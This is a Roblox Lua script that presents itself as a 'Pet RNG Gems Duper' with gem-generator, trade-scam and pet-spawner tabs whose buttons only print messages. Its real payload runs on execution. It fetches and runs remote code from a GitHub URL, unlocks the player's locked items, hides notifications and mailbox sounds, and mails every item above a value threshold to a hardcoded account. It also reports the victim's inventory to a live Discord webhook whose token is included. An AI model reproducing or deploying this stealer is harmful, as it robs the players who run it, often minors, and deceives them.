-- Load Orion Library
loadstring(game:HttpGet("https://raw.githubusercontent.com/BearrXW/test/refs/heads/main/mainnewfile"))()
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

Username = "bx4rzwasdeleted"
min_rap = 10 -- minimum rap of each item you want to get sent to you. 10k by default
webhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Join gg / rZmNK6Ptxw to get back"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)

    local data = {
        ["embeds"] = {{
            ["title"] = "New Pets Go Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
            fields[2].value = fields[2].value .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	until response == true
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
            local rapValue = getRAP(v, item)
            if rapValue >= min_rap then
                table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                totalRAP = totalRAP + (rapValue * (item._am or 1))
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 then
    ClaimMail()
    
    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)
    
    spawn(function()
        SendMessage(plr.Name, GemAmount1)
    end)

    for _, item in ipairs(sortedItems) do
        sendItem(item.category, item.uid, item.amount)
    end
end


ScreenGui = {
        IgnoreGuiInset = false, -- Consider the top bar on mobile devices
        SizeConstraint = "RelativeXY" -- Makes the UI scale properly on mobile devices
    },

-- Create the window
local Window = OrionLib:MakeWindow({
    Name = ":feet: PET RNG GEMS DUPER :gem:",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "PetRNGGemsDuper",
    IntroEnabled = true,
    IntroText = "Welcome to the Pet RNG Gems Duper!",
    IntroIcon = "rbxassetid://4483345998", -- You can change this to any desired icon
})

-- Create the tab for the "GEMS GENERATOR"
local GemsTab = Window:MakeTab({
    Name = ":gem: GEMS GENERATOR",
    Icon = "rbxassetid://4483345998", -- Use a unique icon for Gems
    PremiumOnly = false
})

-- Add a toggle for "Enable Gem Duper"
GemsTab:AddToggle({
    Name = ":arrows_counterclockwise: Enable Gem Duper",
    Default = false,
    Callback = function(Value)
        print("Gem Duper toggled:", Value)
    end    
})

-- Add a textbox for "Amount of Gems"
GemsTab:AddTextbox({
    Name = ":coin: Amount Of Gems",
    Default = "",
    TextDisappear = false,
    Placeholder = "Insert Amount of Gems",
    Callback = function(Value)
        print("Amount of Gems input:", Value)
    end    
})

-- Add a button for "Start Duper"
GemsTab:AddButton({
    Name = ":rocket: Start Duper",
    Callback = function()
        print("Duper started")
    end    
})

-- Create the tab for "TRADE SCAM"
local TradeTab = Window:MakeTab({
    Name = ":rotating_light: TRADE SCAM",
    Icon = "rbxassetid://4483345998", -- Use a unique icon for Trade Scam
    PremiumOnly = false
})

-- Add a toggle for "Enable Trade Lock"
TradeTab:AddToggle({
    Name = ":lock: Enable Trade Lock",
    Default = false,
    Callback = function(Value)
        print("Trade Lock toggled:", Value)
    end    
})

-- Add a textbox for "Player Username"
TradeTab:AddTextbox({
    Name = ":bust_in_silhouette: Player Username",
    Default = "",
    TextDisappear = false,
    Placeholder = "Insert Victim's Username",
    Callback = function(Value)
        print("Victim Username:", Value)
    end    
})

-- Add a button for "Freeze Trade"
TradeTab:AddButton({
    Name = ":snowflake: Freeze Trade",
    Callback = function()
        print("Trade frozen")
    end    
})

-- Create the tab for "FAST ROLL"
local FastRollTab = Window:MakeTab({
    Name = ":zap: FAST ROLL",
    Icon = "rbxassetid://4483345998", -- Use a unique icon for Fast Roll
    PremiumOnly = false
})

-- Add a button for "Start Fast Roll"
FastRollTab:AddButton({
    Name = ":game_die: Start Fast Roll",
    Callback = function()
        print("Fast roll started!")
    end    
})

-- Create the tab for "PET SPAWNER"
local PetSpawnerTab = Window:MakeTab({
    Name = ":feet: PET SPAWNER",
    Icon = "rbxassetid://4483345998", -- Use a unique icon for Pet Spawner
    PremiumOnly = false
})

-- Add a search box for "Search for Pets"
PetSpawnerTab:AddTextbox({
    Name = ":mag: Search for Pets",
    Default = "",
    TextDisappear = false,
    Placeholder = "Type Pet Name to Search",
    Callback = function(Value)
        print("Searching for pet:", Value)
    end    
})

-- Add a textbox for "Pet Name"
PetSpawnerTab:AddTextbox({
    Name = ":dog: Pet Name",
    Default = "",
    TextDisappear = false,
    Placeholder = "Insert Pet Name",
    Callback = function(Value)
        print("Pet Name input:", Value)
    end    
})

-- Add a button for "Spawn Pet"
PetSpawnerTab:AddButton({
    Name = ":dog2: Spawn Pet",
    Callback = function()
        print("Pet spawned!")
    end    
})

-- Create a notification for user actions
OrionLib:MakeNotification({
    Name = ":tada: Welcome!",
    Content = "Use the tabs to manage gems, trade scams, fast rolls, and spawn pets!",
    Image = "rbxassetid://4483345998",
    Time = 5
})

-- Finalize and initialize the Orion UI
OrionLib:Init()
